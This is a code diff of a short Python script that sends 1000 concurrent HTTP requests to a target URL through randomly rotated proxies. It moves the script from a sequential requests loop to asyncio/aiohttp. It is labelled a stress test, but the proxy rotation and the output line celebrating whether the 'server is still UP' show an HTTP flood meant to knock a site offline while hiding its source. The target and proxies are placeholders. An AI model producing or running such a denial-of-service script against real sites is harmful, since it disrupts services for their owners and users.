@@ -1,7 +1,8 @@
-import requests
+import asyncio
+import aiohttp
 import random
 
-# list of proxies, u could also use file
+# list of proxies
 proxies = [
     "http://proxy1:port",
     "http://proxy2:port",
@@ -15,14 +16,25 @@ target_url = "http://example.com"
 # number of requests to send
 num_requests = 1000
 
-# send requests
-for i in range(num_requests):
-    # select a random proxy
-    proxy = random.choice(proxies)
-    # send the request
-    response = requests.get(target_url, proxies={"http": proxy, "https": proxy})
-    # check the response status
-    if response.status_code != 200:
-        print(f"[ERROR] Request {i} failed with status code {response.status_code}")
-    else:
-        print(f"[SUCCESS] Request {i} sent successfully")
+# function to send a single request
+async def send_request(session, proxy):
+    try:
+        async with session.get(target_url, proxy=proxy) as response:
+            if response.status != 200:
+                print(f"[STILLUP] Request SENT but the server is still UP! {response.status}")
+            else:
+                print(f"[SUCCESS] Request sent successfully")
+    except Exception as e:
+        print(f"[ERROR] Request failed with exception: {e}")
+
+# function to start the stress test
+async def start_stress_test():
+    # create a session
+    async with aiohttp.ClientSession() as session:
+        # create a list of tasks
+        tasks = [send_request(session, random.choice(proxies)) for _ in range(num_requests)]
+        # run the tasks in parallel
+        await asyncio.gather(*tasks)
+
+# start the stress test
+asyncio.run(start_stress_test())
